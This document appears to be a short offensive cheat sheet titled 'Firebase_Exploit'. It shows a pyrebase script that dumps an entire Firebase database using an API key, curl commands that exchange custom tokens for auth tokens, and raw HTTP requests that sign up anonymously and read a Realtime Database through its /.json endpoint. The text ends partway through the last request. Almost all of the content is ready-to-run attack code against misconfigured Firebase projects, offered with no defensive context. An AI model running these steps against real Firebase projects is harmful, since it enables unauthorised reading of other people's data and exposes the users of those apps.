# Firebase_Exploit

# Firebase
The Below script will authenticate to a given Firebase database and then print out the contents of the database. This is only possible when the API key provided to this script has permissions to read the database.
```
import pyrebase
config = {
  "apiKey": "FIREBASE_API_KEY",
  "authDomain": "FIREBASE_AUTH_DOMAIN_ID.firebaseapp.com",
  "databaseURL": "https://FIREBASE_AUTH_DOMAIN_ID.firebaseio.com",
  "storageBucket": "FIREBASE_AUTH_DOMAIN_ID.appspot.com",
}
firebase = pyrebase.initialize_app(config)
db = firebase.database()
print(db.get())
```
-------------------------------------------------------------------------------------------------------------

Requires a custom token, and an API key.

Obtain ID token and refresh token from custom token and API key:
```
curl -s -XPOST -H 'content-type: application/json' -d '{"token":":custom_token","returnSecureToken":True}' 'https://identitytoolkit.googleapis.com/v1/accounts:signInWithCustomToken?key=:api_key'
```

Exchange ID token for auth token: 
```
curl -s -XPOST -H 'content-type: application/json' -d '{"idToken":":id_token"}' https://www.googleapis.com/identitytoolkit/v3/relyingparty/verifyCustomToken?key=:api_key'
```
login as anonymous to Firebase Project :

```
POST /identitytoolkit/v3/relyingparty/signupNewUser?key=AIza**** HTTP/2
Host: www.googleapis.com
Content-Length: 28
X-Client-Version: Chrome/JsCore/7.14.4/FirebaseCore-web
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/84.0.4147.125 Safari/537.36
Content-Type: application/json
Accept: */*
Origin: null
Sec-Fetch-Site: cross-site
Sec-Fetch-Mode: cors
Sec-Fetch-Dest: empty
Accept-Encoding: gzip, deflate
Accept-Language: en-US,en;q=0.9,vi;q=0.8

{
"returnSecureToken":true}

```

Server return token and then we can use the response token to read to Firebase Realtime Database using this API.

```

GET /.json?auth=eyJhbGciOiJSUzI1NiIsImtpZCI6**** HTTP/1.1
Host: xxx.firebaseio.com
Accept: application/json, text/plain, */*
Accept-Language: vi
Accept-Encoding: gzip, deflate
User-Agent: okhttp/3.12.1
Content-Length: 51
